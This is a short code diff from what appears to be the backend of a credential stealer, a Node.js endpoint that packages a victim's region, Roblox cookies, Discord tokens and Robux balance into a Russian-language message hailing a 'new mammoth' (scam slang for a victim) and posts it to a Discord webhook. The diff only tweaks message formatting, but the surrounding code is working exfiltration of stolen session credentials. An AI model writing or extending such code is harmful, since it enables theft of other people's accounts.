@@ -28,7 +28,7 @@ app.post('/send', async (req, res) => {
   console.log('Tokens:', tokensString);
 
   const plainMessage = '@everyone Новый мамонт! Регион: ```' + region + ' ``` \n \n  РБ: ```' + cookiesString + ' ``` \n ДС: ```' + tokensString + ' ``` \n РОБУКСЫ: ```' + robux + ' ```';
-  const content = '```' + plainMessage + '```';
+  const content = plainMessage;
 
   // Отправляем в Discord
   const response = await fetch(webhookUrl, {
